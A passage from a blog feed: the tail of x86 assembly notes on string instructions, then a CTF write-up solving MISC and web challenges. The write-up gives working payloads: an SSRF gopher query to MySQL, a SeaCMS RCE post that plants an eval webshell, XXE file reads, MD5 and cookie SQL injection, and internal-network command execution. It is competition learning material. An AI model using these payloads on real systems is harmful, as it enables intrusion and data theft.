class="built_in">dword</span>  <span class="number">5678h</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="comment">; …</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span> , offset source</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset target</span><br><span class="line">  <span class="keyword">cmpsd</span>   <span class="comment">;比较双字</span></span><br><span class="line">  <span class="keyword">ja</span> L1     <span class="comment">;如果source&gt;targe跳转至L1 </span></span><br><span class="line">  <span class="keyword">jmp</span> L2  <span class="comment">;如果source&lt;=target跳转至L2，本例即是</span></span><br><span class="line">  <span class="comment">; ….</span></span><br></pre></td></tr></table></figure><h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span></span><br><span class="line">CmpsTestSource <span class="built_in">byte</span> <span class="string">"ABCDE"</span></span><br><span class="line">CmpsTestTarget  <span class="built_in">byte</span> <span class="string">"AB   "</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">CMPSTEST proc</span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">esi</span> , offset CmpsTestSource</span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">edi</span> , offset CmpsTestTarget</span><br><span class="line">  <span class="keyword">mov</span>  <span class="built_in">ecx</span>, lengthof CmpsTestSource  <span class="comment">;最多比较次数，此例为5</span></span><br><span class="line">  <span class="keyword">repe</span>  <span class="keyword">cmpsb</span> <span class="comment">; 比较到第三个字母时，因两者不等，重复不再继续，但当前串</span></span><br><span class="line">                         <span class="comment">; 操作执行完，esi和edi还会增加。所以，最后，esi和edi会指向</span></span><br><span class="line">                         <span class="comment">; 第四个字母的位置。</span></span><br><span class="line">  <span class="keyword">ret</span></span><br><span class="line">CMPSTEST endp</span><br></pre></td></tr></table></figure><h3 id="SCASB-SCASW-SCASD"><a href="#SCASB-SCASW-SCASD" class="headerlink" title="SCASB,SCASW,SCASD"></a>SCASB,SCASW,SCASD</h3><p>将AL的值与EDI指向的内存内容相比较(相当于cmp AL , [edi])，即相当于是做查找操作，通常会跟重复前缀</p><ul><li>如果使用repe前缀，则将查找到EDI开始的内存中第一个不等于AL时中止重复;</li><li>如果使用repne前缀，则将查找到EDI开始的内存中第一个等于AL时中止重复;</li><li>当然，如果ecx减到0，也会结束查找<br><code>SCASW</code>是用AX作字查找，<code>SCASD</code>是用EAX作双字查找<h4 id="扫描一个匹配字符"><a href="#扫描一个匹配字符" class="headerlink" title="扫描一个匹配字符"></a>扫描一个匹配字符</h4><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">.data</span> </span><br><span class="line">  alpha <span class="built_in">byte</span> “ABCDEFGH”,<span class="number">0</span></span><br><span class="line"><span class="meta">.code</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edi</span> , offset alpha</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">al</span> , ‘F’</span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span> , lengthof alpha</span><br><span class="line">  <span class="keyword">cld</span></span><br><span class="line">  <span class="keyword">repne</span> <span class="keyword">scasb</span>   <span class="comment">;不相等则重复，即找到第一个相等的</span></span><br><span class="line">  <span class="keyword">jnz</span> quit    <span class="comment">; 如果这个条件满足，表示是找完整个ecx长度，也没有找到</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">edi</span>   <span class="comment">;回减一，让edi指向找到第一个相等的位置</span></span><br><span class="line">  …</span><br><span class="line"><span class="symbol">Quit:</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="STOSB-STOSW-STOSD"><a href="#STOSB-STOSW-STOSD" class="headerlink" title="STOSB,STOSW,STOSD"></a>STOSB,STOSW,STOSD</h3><p>把AL/AX/EAX的内容存储在EDI指向的内存单元中，同时EDI的值根据方向标志的值增加和减少。<br>Stosb是存储AL，stosw存储AX，stosd存储EAX   使用rep前缀可以对一段内存进行填充</p><h3 id="LODSB-LODSW-LODSD"><a href="#LODSB-LODSW-LODSD" class="headerlink" title="LODSB,LODSW,LODSD"></a>LODSB,LODSW,LODSD</h3><p>将从esi指向的内存内容取出存到累加器中，同时，修改esi的值。<br><code>lodsb</code>是取出一个字节存到AL中，<code>lodsw</code>是取出一个字存到AX中，<code>lodsd</code>是取出一个双字存到EAX中。<br><strong>该指令一般不会跟重复前缀</strong></p><h3 id="串操作指令对标志位的影响"><a href="#串操作指令对标志位的影响" class="headerlink" title="串操作指令对标志位的影响"></a>串操作指令对标志位的影响</h3><p><code>cmps</code>和<code>scas</code>指令会对标志位有影响，影响效果如同CMP指</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-IA32处理器体系结构&quot;&gt;&lt;a href=&quot;#0x00-IA32处理器体系结构&quot; class=&quot;headerlink&quot; title=&quot;0x00 IA32处理器体系结构&quot;&gt;&lt;/a&gt;0x00 IA32处理器体系结构&lt;/h2&gt;&lt;h3 id=&quot;微机的基本结构&quot;&gt;
      
    
    </summary>
    
    
      <category term="学习笔记" scheme="https://www.twosmi1e.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>安洵杯writewp</title>
    <link href="https://www.twosmi1e.com/2018/11/26/%E5%AE%89%E6%B4%B5%E6%9D%AFwritewp/"/>
    <id>https://www.twosmi1e.com/2018/11/26/安洵杯writewp/</id>
    <published>2018-11-26T13:37:41.000Z</published>
    <updated>2018-11-26T13:42:11.970Z</updated>
    
    <content type="html"><![CDATA[<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="CRC"><a href="#CRC" class="headerlink" title="CRC"></a>CRC</h3><p>第一个压缩包，提示CRC爆破结果是纯数字，直接爆破<br>里面三个文件，看了一下大概是要先解压password然后运行.py计算flag.zip的解压密码。<br>然后crc32碰撞，直接爆破password.txt的内容<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>,<span class="number">100000000</span>):</span><br><span class="line">buf = str(i).rjust(<span class="number">8</span>,<span class="string">'0'</span>)</span><br><span class="line"><span class="comment">#print buf</span></span><br><span class="line">    <span class="keyword">if</span> zlib.crc32(buf) &amp; <span class="number">0xffffffff</span> == <span class="number">0x0cd95dac</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">''</span>,buf</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543154531102.png" alt="Alt text"><br>然后再用.py跑<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="comment">#f = open("password.txt",'r')</span></span><br><span class="line"><span class="comment">#password = f.readline()</span></span><br><span class="line">password=<span class="string">'08646247'</span></span><br><span class="line">b64_str = base64.b64encode(password.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">hash = hashlib.md5()</span><br><span class="line">hash.update(b64_str)</span><br><span class="line">zip_passowrd = hash.hexdigest()</span><br><span class="line">print(zip_passowrd)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543154965351.png" alt="Alt text"><br>再去解压flag.zip,解压出来一张图片<br>改高度，先直接winhex改了过后图片直接崩了，然后绕了一会，结果就是该高度，winhex不对应该是crc的原因。<br><img src="/2018/11/26/安洵杯writewp/1543155653161.png" alt="Alt text"><br>修改高度为500<br><img src="/2018/11/26/安洵杯writewp/1543155673584.png" alt="Alt text"><br>可以看到flag了导出 提取文字完事。<br><img src="/2018/11/26/安洵杯writewp/1543155715575.png" alt="Alt text"></p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h3><p>提示输入NOHO<br>测出来要求在7399999999到7400000000<br><a href="http://222.18.158.227:10580/?NOHO[]=d" target="_blank" rel="external">http://222.18.158.227:10580/?NOHO[]=d</a>  数组绕过<br><img src="/2018/11/26/安洵杯writewp/1543026226298.png" alt="Alt text"><br>输密码<br><code>&lt;!--SELECT master FROM secret WHERE password = binary &#39;c���{��Pykd��HE&#39;--&gt;</code><br>发现是MD5加密后16进制转字符<br><img src="/2018/11/26/安洵杯writewp/1543150100581.png" alt="Alt text"><br>MD5注入<br>ffifdyop<br><img src="/2018/11/26/安洵杯writewp/1543150034193.png" alt="Alt text"></p><h3 id="蒙古-Diglett"><a href="#蒙古-Diglett" class="headerlink" title="蒙古 Diglett"></a>蒙古 Diglett</h3><p>ssrf<br><a href="http://54.200.169.99:7001/index.php?hu3debug=1" target="_blank" rel="external">http://54.200.169.99:7001/index.php?hu3debug=1</a> 找到源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    include_once &quot;config.php&quot;;</span><br><span class="line">    if (isset($_POST[&apos;url&apos;])&amp;&amp;!empty($_POST[&apos;url&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        $url = $_POST[&apos;url&apos;];</span><br><span class="line">        if(preg_match(&apos;/file/&apos;,$url))</span><br><span class="line">        &#123;</span><br><span class="line">             echo &quot;No hacker!&quot;;</span><br><span class="line">             echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        $url2 = preg_replace(&apos;/file/&apos;,&apos;&apos;,$url);</span><br><span class="line">        $content_url = getUrlContent($url2);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        $content_url = &quot;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    if(isset($_GET[&apos;hu3debug&apos;]))</span><br><span class="line">    &#123;</span><br><span class="line">        show_source(__FILE__);</span><br><span class="line">    &#125;</span><br><span class="line">   ?&gt;</span><br></pre></td></tr></table></figure></p><p>过滤了file尝试双写绕过<br>读配置文件<br>url=fifilele://localhost/var/www/config.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$hosts = &quot;localhost&quot;;</span><br><span class="line">$dbusername = &quot;test_user&quot;;</span><br><span class="line">$dbpasswd = &quot;&quot;;</span><br><span class="line">$dbname = &quot;test&quot;;</span><br><span class="line">$dbport = 3306;</span><br><span class="line">$conn = mysqli_connect($hosts,$dbusername,$dbpasswd,$dbname,$dbport);</span><br><span class="line">function initdb($conn)</span><br><span class="line">&#123;</span><br><span class="line">$dbinit = &quot;create table if not exists flag(secret varchar(100));&quot;;</span><br><span class="line">if(mysqli_query($conn,$dbinit)) return 1;</span><br><span class="line">else return 0;</span><br><span class="line">&#125;</span><br><span class="line">function safe($url)</span><br><span class="line">&#123;</span><br><span class="line">$tmpurl = parse_url($url, PHP_URL_HOST);</span><br><span class="line">if($tmpurl != &quot;localhost&quot; and $tmpurl != &quot;127.0.0.1&quot;)</span><br><span class="line">&#123;</span><br><span class="line">var_dump($tmpurl);</span><br><span class="line">die(&quot;&lt;h1&gt;&lt;p id=&apos;test1&apos;&gt;You are not the local!&lt;/p&gt;&lt;/h1&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line">return $url;</span><br><span class="line">&#125;</span><br><span class="line">function getUrlContent($url)&#123;</span><br><span class="line">$url = safe($url);</span><br><span class="line">$url = escapeshellarg($url);</span><br><span class="line">$pl = &quot;curl &quot;.$url;</span><br><span class="line">echo $pl;</span><br><span class="line">$content = shell_exec($pl);</span><br><span class="line">return $content;</span><br><span class="line">&#125;</span><br><span class="line">initdb($conn);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>知道了mysql的配置内容 gopher一波<br><img src="/2018/11/26/安洵杯writewp/1543075424002.png" alt="Alt text"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:3306/_%a8%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%74%65%73%74%5f%75%73%65%72%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%18%00%00%00%03%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%74%65%73%74%2e%66%6c%61%67%01%00%00%00%01</span><br></pre></td></tr></table></figure></p><p><img src="/2018/11/26/安洵杯writewp/1543207604363.png" alt="Alt text"></p><p>D0g3{G0ph1er_4nd_55rf_1s_1nt3rest1ng!}</p><h3 id="BOOM-web"><a href="#BOOM-web" class="headerlink" title="BOOM web"></a>BOOM web</h3><p>御剑扫目录<br>后台登录地址：<a href="http://222.18.158.227:10080/admin/login.html" target="_blank" rel="external">http://222.18.158.227:10080/admin/login.html</a><br>题目是boom就直接爆破吧，看题目描述应该是绕过这个验证码，刷新数字变大，估计是时间戳生成。<br><img src="/2018/11/26/安洵杯writewp/1543158391091.png" alt="Alt text"><br>但是测了一下可以直接空等于空绕过，然后直接intruder爆破<br>爆了很久的弱口令 结果是纯数字 很坑。<br><img src="/2018/11/26/安洵杯writewp/1543158721467.png" alt="Alt text"><br>登录拿flag<img src="/2018/11/26/安洵杯writewp/1543158778138.png" alt="Alt text"><br>70e052657cb40cf142883abaff266fee</p><h3 id="中国-webN"><a href="#中国-webN" class="headerlink" title="中国 webN"></a>中国 webN</h3><p><img src="/2018/11/26/安洵杯writewp/1543206219303.png" alt="Alt text"><br>首页一个SRC界面，没什么用<br>点礼品中心<a href="http://222.18.158.245:6080/reward.php点击购买" target="_blank" rel="external">http://222.18.158.245:6080/reward.php点击购买</a><br><img src="/2018/11/26/安洵杯writewp/1543206407046.png" alt="Alt text"><br>发现用户可控jsonp<br><img src="/2018/11/26/安洵杯writewp/1543206721265.png" alt="Alt text"><br>看提示some攻击，翻文章<br><a href="https://paper.tuisec.win/detail/05c9c8b3e28bd2b" target="_blank" rel="external">https://paper.tuisec.win/detail/05c9c8b3e28bd2b</a><br><a href="https://www.freebuf.com/articles/web/169873.html" target="_blank" rel="external">https://www.freebuf.com/articles/web/169873.html</a><br>然后还提示联系客服，思路大概就是构造exp放vps上，发客服让机器人访问，子页面通过可控jsonp对父页面操作<br><img src="/2018/11/26/安洵杯writewp/1543159598524.png" alt="Alt text"><br>查日志发现flag<br><img src="/2018/11/26/安洵杯writewp/1543159548320.png" alt="Alt text"></p><h3 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h3><p>题目提示Find The d0g3.php In Intranets<br><img src="/2018/11/26/安洵杯writewp/1543215290607.png" alt="Alt text"><br>在name提交框那里随便提交一个test，发现输出到了url的url参数<br><a href="http://222.18.158.227:10180/?url=test#" target="_blank" rel="external">http://222.18.158.227:10180/?url=test#</a><br>思路大概就有了，ssrf扫内网，访问d0g3.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.0-255&apos;</span><br></pre></td></tr></table></figure><p>扫一遍发现有<code>10.10.1.3</code>和<code>10.10.1.6</code>两台主机，利用同样的方法扫描端口，发现只有80端口，并且只有<code>10.10.1.6</code>主机才有d0g3.php，访问<code>10.10.1.6/d0g3.php</code>提示<br><code>curl -v &#39;http://222.18.158.227:10180/?url=http%3A%2F%2F10.10.1.6%2Fd0g3.php&#39;</code><br><img src="/2018/11/26/安洵杯writewp/1543215732496.png" alt="Alt text"></p><p>传入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=phpinfo();&apos;</span><br></pre></td></tr></table></figure><p>发现执行了命令</p><p>于是读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v &apos;http://222.18.158.227:10180/?url=http://10.10.1.6/d0g3.php?d0g3=echo `cat flag.txt`; &apos;</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;SSRF_Is_So_Easy&#125;</span><br></pre></td></tr></table></figure><h3 id="only-d0g3er-can-see-flag"><a href="#only-d0g3er-can-see-flag" class="headerlink" title="only d0g3er can see flag"></a>only d0g3er can see flag</h3><p>查找poc getshell<br><a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="external">https://www.freebuf.com/vuls/150042.html</a></p><p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;&amp;9[]=phpinfo();</span><br></pre></td></tr></table></figure></p><p>那就写shell吧<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=file_put_contents(&apos;../shell.php&apos;,&apos;&lt;?php%20@eval($_POST[123])?&gt;&apos;);</span><br></pre></td></tr></table></figure></p><p>提示.git泄露，用工具读出源码吧<br>\data\ common.inc.php有配置信息</p><p>直接写sql语句读取flag</p><p><a href="http://138.68.2.14/seacms/search.php" target="_blank" rel="external">http://138.68.2.14/seacms/search.php</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=$con =mysql_connect(&quot;localhost&quot;,&quot;d0g3&quot;,&quot;FlagIsHere&quot;);</span><br><span class="line">mysql_select_db(&quot;flag&quot;, $con);</span><br><span class="line">$result = mysql_query(&quot;SELECT * from flag&quot;);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line">var_dump($row);</span><br></pre></td></tr></table></figure></p><p>RDBnM3tUaGlzX2lzX3JlYWxfZmxhZ30=<br>Base64解码：D0g3{This_is_real_flag}</p><h3 id="Magic-Mirror"><a href="#Magic-Mirror" class="headerlink" title="Magic Mirror"></a>Magic Mirror</h3><p>思路是在忘记密码处，填入管理员账户<code>admin</code>，重置管理员账号密码，然后登录管理员账号。</p><p>但是重置时会发送重置邮件，根据官方的提示，抓包将host改为vps地址，然后在vbs上开启一个web服务，目标主机就会带着重置token去访问我们的vps，然后我们利用这个token访问密码重置页面就能重置admin密码了</p><p>登录后还有一个输入框，任意提交一个字符串后抓包发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;information&gt;&lt;username&gt;test&lt;/username&gt;&lt;/information&gt;</span><br></pre></td></tr></table></figure><p>xxe无误，直接读取文件</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="ISO-8859-1"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE foo [ </span></span><br><span class="line"><span class="meta">&lt;!ENTITY myentity SYSTEM "php://filter/read=convert.base64-encode/resource=file:///var/www/html/flag.php" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">information</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span>&amp;myentity;<span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;/<span class="name">information</span>&gt;</span></span><br></pre></td></tr></table></figure><p>外部实体注入  Filter协议读文件  记得base6<br>拿到flag.php的base64编码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAKaGVhZGVyKCJDb250ZW50LVR5cGU6IHRleHQvaHRtbDtjaGFyc2V0PXV0Zi04Iik7CmVjaG8gIjxjZW50ZXI+PGZvbnQgc2l6ZT0nNScgY29sb3I9J3JlZCc+IjsKZWNobyAiWW91IHdhbm5hIGNhcHR1cmUgdGhpcyBmbGFnPyI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiT2ggeWVzLCBoZXJlISI7CmVjaG8gIjxicj48YnI+IjsKZWNobyAiQnV0IG5vdywgIjsKZWNobyAiPGJyPjxicj4iOwplY2hvICJHZXQgb3V0ISI7CmVjaG8gIjwvZm9udD48L2NlbnRlcj4iOwovL2ZsYWc6IEQwZzN7SGlfRDBnM19SZXMzdF80bmRfeFhlfQoKCj8+Cg==</span><br></pre></td></tr></table></figure><p>解码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Type: text/html;charset=utf-8&quot;);</span><br><span class="line">echo &quot;&lt;center&gt;&lt;font size=&apos;5&apos; color=&apos;red&apos;&gt;&quot;;</span><br><span class="line">echo &quot;You wanna capture this flag?&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Oh yes, here!&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;But now, &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;Get out!&quot;;</span><br><span class="line">echo &quot;&lt;/font&gt;&lt;/center&gt;&quot;;</span><br><span class="line">//flag: D0g3&#123;Hi_D0g3_Res3t_4nd_xXe&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><h3 id="simple-sqli"><a href="#simple-sqli" class="headerlink" title="simple sqli"></a>simple sqli</h3><p>一开始以为是二次注入，因为注册一个test’，登录后会报错。后面发现是cookie注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r sql.txt --cookie &quot;PHPSESSID=p6364j7vahfs88uiesq03g1e25;uname=1&quot; --dbms mysql --level 2 --tamper base64encode,charencode --sql-shell</span><br></pre></td></tr></table></figure><p>当时进入了sql-shell，但是马上时间截止了，很慌就没来得及找web路径，赛后发现有phpinfo</p><p>直接读取flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&apos;/www/sqli/secret.php&apos;)</span><br></pre></td></tr></table></figure><p>base64解码后就是flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D0g3&#123;iaown_oiasnd_asdasda&#125;</span><br></pre></td></tr></table></figure><h3 id="Hash"><a href="#Hash" class="headerlink" title="Hash!!!"></a>Hash!!!</h3><p>响应头的source改为1就能拿到核心源码，可以看到是cbc翻转攻击，利用hashpump来构造poc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">@error_reporting(0);</span><br><span class="line"></span><br><span class="line">$flag = &quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;;</span><br><span class="line">$secret_key = &quot;xxxxxxxxxxxxxxxxxxxxxx&quot;; // the key is safe! no one can know except me</span><br><span class="line"></span><br><span class="line">$username = $_POST[&quot;username&quot;];</span><br><span class="line">$password = $_POST[&quot;password&quot;];</span><br><span class="line">header(&quot;hash_key:&quot; . $hash_key);</span><br><span class="line"></span><br><span class="line">if (!empty($_COOKIE[&quot;getflag&quot;])) &#123;</span><br><span class="line">    if (urldecode($username) === &quot;D0g3&quot; &amp;&amp; urldecode($password) != &quot;D0g3&quot;) &#123;</span><br><span class="line">        if ($COOKIE[&quot;getflag&quot;] === md5($secret_key . urldecode($username . $password))) &#123;</span><br><span class="line">            echo &quot;Great! You&apos;re in!\n&quot;;</span><br><span class="line">            die (&quot;&lt;!-- The flag is &quot;. $flag . &quot;--&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            die (&quot;Go out! Hacker!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        die (&quot;LEAVE! You&apos;re not one of us!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(&quot;sample-hash&quot;, md5($secret_key . urldecode(&quot;D0g3&quot; . &quot;D0g3&quot;)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&quot;source&quot;])) &#123;</span><br><span class="line">    